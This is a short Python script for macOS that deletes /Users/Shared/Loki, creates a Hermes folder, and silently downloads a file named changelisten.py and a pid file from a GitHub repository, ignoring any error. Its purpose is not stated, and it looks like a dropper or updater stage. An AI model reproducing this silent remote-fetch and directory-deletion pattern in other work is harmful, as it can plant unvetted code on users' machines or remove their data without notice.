import shutil
import os
shutil.rmtree ('/Users/Shared/Loki')
try:
  os.mkdir ('/Users/Shared/Hermes')
  import time
  time.sleep (0.5)
  import urllib
  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/changelisten.py", "/Users/Shared/Hermes/changelisten.py")
  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/pid.txt", "/Users/Shared/Hermes/pid.txt")
  time.sleep (1)
except:
  pass
